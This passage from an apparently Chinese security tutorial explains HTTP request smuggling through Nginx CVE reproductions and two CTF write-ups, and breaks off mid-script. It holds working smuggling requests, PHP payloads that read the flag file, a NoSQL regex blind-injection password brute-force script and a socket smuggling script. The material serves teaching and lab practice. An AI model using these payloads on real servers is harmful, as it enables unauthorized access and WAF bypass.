localhost\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">35</span>\\r\\n\n\\r\\n\n\\r\\n\n<span class=\"token constant\">GET</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nHost<span class=\"token punctuation\">:</span> localhost\\r\\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这个时候就导致了请求走私漏洞，访问到了本该拦截的<code>/admin</code>请求</p>\n<h2 id=\"Nginx-error-page-请求走私漏洞-CVE-2019-20372\"><a href=\"#Nginx-error-page-请求走私漏洞-CVE-2019-20372\" class=\"headerlink\" title=\"Nginx error_page 请求走私漏洞(CVE-2019-20372)\"></a>Nginx error_page 请求走私漏洞(CVE-2019-20372)</h2><p>Nginx 1.17.7之前版本中 error_page 存在安全漏洞。攻击者可利用该漏洞读取未授权的Web页面。</p>\n<p>漏洞的成因是<code>Nginx1.17.7</code> 及之前版本具有<code> error_page</code> 配置，它不使用 <code>error_page</code> 进行 302 重定向。它仅使用<code> error_page</code> 使用命名位置，如</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">error_page <span class=\"token number\">404</span> <span class=\"token operator\">/</span><span class=\"token number\">404.</span>php；<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时攻击者能够在 NGINX 由负载均衡器前端的环境中读取未经授权的网页，就造成了请求走私攻击。<br>这里可以参考<code>Vow</code>大师傅给出的存在漏洞的配置</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">server <span class=\"token punctuation\">&#123;</span>\n listen <span class=\"token number\">80</span><span class=\"token punctuation\">;</span>\n server_name localhost<span class=\"token punctuation\">;</span>\n error_page <span class=\"token number\">401</span> http<span class=\"token punctuation\">:</span><span class=\"token comment\">//example.org;</span>\n location <span class=\"token operator\">/</span> <span class=\"token punctuation\">&#123;</span>\n <span class=\"token keyword\">return</span> <span class=\"token number\">401</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\nserver <span class=\"token punctuation\">&#123;</span>\n listen <span class=\"token number\">80</span><span class=\"token punctuation\">;</span>\n server_name notlocalhost<span class=\"token punctuation\">;</span>\n location <span class=\"token operator\">/</span>_hidden<span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>html <span class=\"token punctuation\">&#123;</span>\n <span class=\"token keyword\">return</span> <span class=\"token number\">200</span> <span class=\"token string single-quoted-string\">'This should be hidden!'</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时我们构造如下请求</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>a <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> localhost\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">56</span>\n<span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>_hidden<span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>html <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> notlocalhost<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>服务器就会认为这是两个请求。</p>\n<p>得到的回显如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span> <span class=\"token number\">302</span> Moved Temporarily\nServer<span class=\"token punctuation\">:</span> nginx<span class=\"token operator\">/</span><span class=\"token number\">1.17</span><span class=\"token number\">.6</span>\nDate<span class=\"token punctuation\">:</span> Fri<span class=\"token punctuation\">,</span> <span class=\"token number\">06</span> Dec <span class=\"token number\">2019</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">23</span><span class=\"token punctuation\">:</span><span class=\"token number\">33</span> <span class=\"token constant\">GMT</span>\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> text<span class=\"token operator\">/</span>html\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">145</span>\nConnection<span class=\"token punctuation\">:</span> keep<span class=\"token operator\">-</span>alive\nLocation<span class=\"token punctuation\">:</span> http<span class=\"token punctuation\">:</span><span class=\"token comment\">//example.org</span>\n<span class=\"token operator\">&lt;</span>html<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>head<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>title<span class=\"token operator\">></span><span class=\"token number\">302</span> Found<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>head<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>body<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>center<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>h1<span class=\"token operator\">></span><span class=\"token number\">302</span> Found<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>center<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>hr<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>center<span class=\"token operator\">></span>nginx<span class=\"token operator\">/</span><span class=\"token number\">1.17</span><span class=\"token number\">.6</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>center<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">></span>\n<span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span> <span class=\"token number\">200</span> <span class=\"token constant\">OK</span>\nServer<span class=\"token punctuation\">:</span> nginx<span class=\"token operator\">/</span><span class=\"token number\">1.17</span><span class=\"token number\">.6</span>\nDate<span class=\"token punctuation\">:</span> Fri<span class=\"token punctuation\">,</span> <span class=\"token number\">06</span> Dec <span class=\"token number\">2019</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">23</span><span class=\"token punctuation\">:</span><span class=\"token number\">33</span> <span class=\"token constant\">GMT</span>\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> text<span class=\"token operator\">/</span>html\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">22</span>\nConnection<span class=\"token punctuation\">:</span> keep<span class=\"token operator\">-</span>alive\nThis should be hidden<span class=\"token operator\">!</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>请求走私攻击成功。</p>\n<h2 id=\"Nginx-lt-1-18-0请求走私漏洞-CVE-2020-12440\"><a href=\"#Nginx-lt-1-18-0请求走私漏洞-CVE-2020-12440\" class=\"headerlink\" title=\"Nginx&lt;=1.18.0请求走私漏洞(CVE-2020-12440)\"></a>Nginx&lt;=1.18.0请求走私漏洞(CVE-2020-12440)</h2><p>Nginx&lt;=1.18.0及之前版本中存在安全漏洞。攻击者可利用该漏洞进行缓存投毒，劫持凭证或绕过安全保护。</p>\n<p>漏洞简述<br>他这里存在<code>CL!=0</code>请求走私漏洞，我们构造恶意代码可同时发送两个请求并收到回显，我们构造请求如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>test<span class=\"token operator\">.</span>html <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> localhost\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">2</span>\n\n<span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>poc<span class=\"token operator\">.</span>html <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> localhost\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">15</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注:test.html中的内容为&lt; html&gt;&lt; h1&gt;Test Page!&lt; /h1&gt;&lt; /html&gt;<br>        poc.html中的内容为NGINX PoC File</p></blockquote>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149333.png\" alt=\"在这里插入图片描述\"><br>请求走私成功，成功访问到了<code>poc.html</code></p>\n<h1 id=\"CTF实战\"><a href=\"#CTF实战\" class=\"headerlink\" title=\"CTF实战\"></a>CTF实战</h1><h2 id=\"RoarCTF-2019-Easy-Calc\"><a href=\"#RoarCTF-2019-Easy-Calc\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Calc\"></a>[RoarCTF 2019]Easy Calc</h2><p>靶机地址<br><a href=\"https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Calc\">https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Calc</a><br>访问界面发现是一个计算器，输入数字和字符可以计算出结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149131.png\" alt=\"在这里插入图片描述\"><br>看眼源代码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149203.png\" alt=\"在这里插入图片描述\"><br>发现一个文件，访问一下<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149252.png\" alt=\"在这里插入图片描述\"><br>发现这里ban了一些字符，但经过测试其实还ban了所有字母这些（属于是前端WAF），那么想要绕过的话这里就可以尝试HTTP请求走私，当我们构造请求走私，让前端报错的时候，这时候就可以直接绕过前端的waf，现在尝试一下<code>CL-CL</code>种类绕过。</p>\n<p>抓包，修改请求方法为POST方法<br>再添加一个<code>Content-Length</code>头，使得前端报错，同时认为这是两个请求，图示如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149396.png\" alt=\"在这里插入图片描述\"><br>而后我们在<code>disable_functions</code>中看到很多函数都被禁用了<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149510.png\" alt=\"在这里插入图片描述\"><br>那么我们这里就用一些其他命令执行的函数来进行绕过读取文件目录<br>用<code>scandir</code>读取根目录，虽然不能直接读取<code>.</code>，但是我们这里可以用<code>chr()</code>函数+<code>ascii码值</code>来进行绕过，构造payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">num<span class=\"token operator\">=</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">47</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149605.png\" alt=\"在这里插入图片描述\"><br>接下来用<code>show_source</code>读取根目录的<code>flagg</code>文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">num<span class=\"token operator\">=</span><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">47</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">102</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">49</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">97</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">103</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">103</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149650.png\" alt=\"在这里插入图片描述\"><br>然后这个的话是一种方法，我们也可以利用<code>CL-TE</code>方式让前端报错，进而绕过WAF实现RCE，图示如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149813.png\" alt=\"在这里插入图片描述\"><br><code>TE-TE</code>亦可<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149847.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"GKCTF-2021-hackme\"><a href=\"#GKCTF-2021-hackme\" class=\"headerlink\" title=\"[GKCTF 2021]hackme\"></a>[GKCTF 2021]hackme</h2><p>题目地址如下<br><a href=\"https://buuoj.cn/challenges#%5BGKCTF%202021%5Dhackme\">https://buuoj.cn/challenges#[GKCTF%202021]hackme</a><br>题目提示如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1、你可能需要unicode<br>2、注意server和其配置文件</p></blockquote>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149068.png\" alt=\"在这里插入图片描述\"><br>进入环境后发现是登录框，先不急着去尝试注入，看看源代码有没有什么提示<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149110.png\" alt=\"在这里插入图片描述\"><br>提示<code>nosql</code>，说明这里很大可能是<code>nosql</code>注入，师傅们如果想了解<code>nosql</code>可以简单参考下这篇文章<a href=\"https://blog.szfszf.top/tech/nosql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93mongodb/\">https://blog.szfszf.top/tech/nosql</a><br>抓包发现这里是<code>json</code>格式<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149171.png\" alt=\"在这里插入图片描述\"><br>我们用永真式尝试绕过</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">&#123;</span><span class=\"token string double-quoted-string\">\"username\"</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$ne</span></span>\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"password\"</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$ne</span></span>\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149236.png\" alt=\"在这里插入图片描述\"><br>被检测出来了，想起来提示中说<code>unicode</code>编码，我们这里尝试编码一下看是否能绕过<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149360.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149370.png\" alt=\"在这里插入图片描述\"><br>这里的话就发现了两种状态<br>即</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">&#123;</span><span class=\"token string double-quoted-string\">\"msg\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"登录失败\"</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#123;</span><span class=\"token string double-quoted-string\">\"msg\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"登录了，但没完全登录\"</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>因此这里可以借助regexp盲注来获取正确密码，脚本如下所示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">import requests\nimport <span class=\"token keyword type-declaration\">string</span>\n \npassword <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span>\nurl <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'http://node4.buuoj.cn:29402/login.php'</span>\n \n<span class=\"token comment\">#盲注当知道了用户名后就可以用正则$regex来爆破密码</span>\n<span class=\"token keyword\">while</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> c in <span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">.</span>printable<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> c not in <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'*'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'+'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'|'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'#'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'&amp;'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'$'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n \n            <span class=\"token comment\"># When the method is GET</span>\n            get_payload <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'?username=admin&amp;password[$regex]=^%s'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>password <span class=\"token operator\">+</span> c<span class=\"token punctuation\">)</span>\n            <span class=\"token comment\"># When the method is POST</span>\n            post_payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token string double-quoted-string\">\"username\"</span><span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string double-quoted-string\">\"password[<span class=\"token interpolation\"><span class=\"token variable\">$regex</span></span>]\"</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'^'</span> <span class=\"token operator\">+</span> password <span class=\"token operator\">+</span> c\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token comment\"># When the method is POST with JSON</span>\n            json_payload <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token string double-quoted-string\">\"&#123;\"</span>username<span class=\"token string double-quoted-string\">\":\"</span>admin<span class=\"token string double-quoted-string\">\", \"</span>password<span class=\"token string double-quoted-string\">\":&#123;\"</span>\\\\u0024\\\\u0072\\\\u0065\\\\u0067\\\\u0065\\\\u0078<span class=\"token string double-quoted-string\">\":\"</span><span class=\"token operator\">^</span><span class=\"token operator\">%</span>s<span class=\"token string double-quoted-string\">\"&#125;&#125;\"</span><span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>password <span class=\"token operator\">+</span> c<span class=\"token punctuation\">)</span>\n            headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string single-quoted-string\">'Content-Type'</span><span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'application/json'</span><span class=\"token punctuation\">&#125;</span>\n            r <span class=\"token operator\">=</span> requests<span class=\"token operator\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>json_payload<span class=\"token punctuation\">)</span>    <span class=\"token comment\"># 简单发送 json</span>\n \n            <span class=\"token comment\">#r = requests.post(url=url, data=post_payload)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token string single-quoted-string\">'但没完全登录'</span> in r<span class=\"token operator\">.</span>content<span class=\"token operator\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token class-name return-type\">password</span> <span class=\"token operator\">+=</span> c\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>最终得到正确密码<code>42276606202db06ad1f29ab6b4a1307f</code><br>登录<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149738.png\" alt=\"在这里插入图片描述\"><br>发现一个读取文件的文件框，抓包尝试一下任意文件读取<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149176.png\" alt=\"在这里插入图片描述\"><br>尝试读取<code>flag</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149902.png\" alt=\"在这里插入图片描述\"><br>提示flag在内网，此时想到题目的提示<code>注意server和其配置文件</code>，查看一下<code>info.php</code>看是否有可利用信息<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149929.png\" alt=\"在这里插入图片描述\"><br>看到使用的是nginx，接下来查看nginx配置文件<code>/usr/local/nginx/conf/nginx.conf</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149988.png\" alt=\"在这里插入图片描述\"><br>发现存在<code>weblogic</code>服务<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130149966.png\" alt=\"在这里插入图片描述\"><br>同时我们发现nginx的版本号是<code>1.17.6</code>，<code>Nginx 1.17.7</code>之前版本中 <code>error_page</code>可能存在安全漏洞，我们可以借此来查看<code>weblogic</code>版本号，构造请求如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>a <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> node4<span class=\"token operator\">.</span>buuoj<span class=\"token operator\">.</span>cn<span class=\"token punctuation\">:</span><span class=\"token number\">28946</span>\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">66</span>\n\n<span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>console<span class=\"token operator\">/</span>login<span class=\"token operator\">/</span>LoginForm<span class=\"token operator\">.</span>jsp <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> weblogic<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里我用bp打并未得到正确回显，但是我看到一位大师傅用socket脚本打出来了，脚本如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">import socket\n\nsSocket <span class=\"token operator\">=</span> socket<span class=\"token operator\">.</span><span class=\"token function\">socket</span><span class=\"token punctuation\">(</span>socket<span class=\"token operator\">.</span><span class=\"token constant\">AF_INET</span><span class=\"token punctuation\">,</span> socket<span class=\"token operator\">.</span><span class=\"token constant\">SOCK_STREAM</span><span class=\"token punctuation\">)</span>\nsSocket<span class=\"token operator\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"node4.buuoj.cn\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">28946</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span> b<span class=\"token string single-quoted-string\">'GET /a HTTP/1.1\\r\\nHost: node3.buuoj.cn\\r\\nContent-Length: 66\\r\\n\\r\\nGET /console/login/LoginForm.jsp HTTP/1.1\\r\\nHost: weblogic\\r\\n\\r\\n'</span>\nsSocket<span class=\"token operator\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>payload<span class=\"token 